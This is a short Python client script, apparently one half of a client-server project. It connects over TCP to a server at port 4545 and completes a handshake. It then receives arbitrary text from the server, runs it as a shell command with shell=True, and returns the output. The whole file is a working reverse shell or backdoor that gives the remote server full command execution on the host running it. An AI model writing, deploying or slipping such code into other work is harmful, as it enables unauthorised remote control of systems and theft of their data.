from shared_logic import timeout
from shared_logic import *

import socket
import subprocess
import select
import logging

logging.basicConfig(filename='clientLogFile.log', filemode='w', encoding='utf-8', level=logging.DEBUG)

FORMAT = "utf-8"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP

client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # for testing

client.connect((IP, 4545)) # connect to server

client.setblocking(0) # not blocking functions for timeouts

logging.info("Starting pairing process")
# reconnect until confirm code send
while True:
    logging.debug("Sending connect message.")
    timeout(client, lambda _client: _client.send(CONNECT_MSG.encode(FORMAT)), None)
    logging.debug("[Waiting] Waiting for reply.")
    reply = timeout(client, lambda _client: _client.recv(16).decode(FORMAT), 20)
    logging.debug(f"-- {reply} -- was send as reply from the server.")
    if reply == CONNECT_MSG_REPLY:
        break

logging.info("Connection has been established")

while True:
    logging.debug("[Waiting] Receiving server msg.")
    reply = timeout(client, lambda _client: _client.recv(1024).decode(FORMAT), None)

    logging.debug(f"New message from server: {reply}. Running as subprocess...")

    run = subprocess.run(reply, shell=True, capture_output=True).stdout

    logging.debug(f"Run results: {run}")

    return_msg = run if run else EMPTY_MSG.encode(FORMAT)
    logging.debug("Sending return message to server")
    timeout(client, lambda _client: _client.send(return_msg), None)
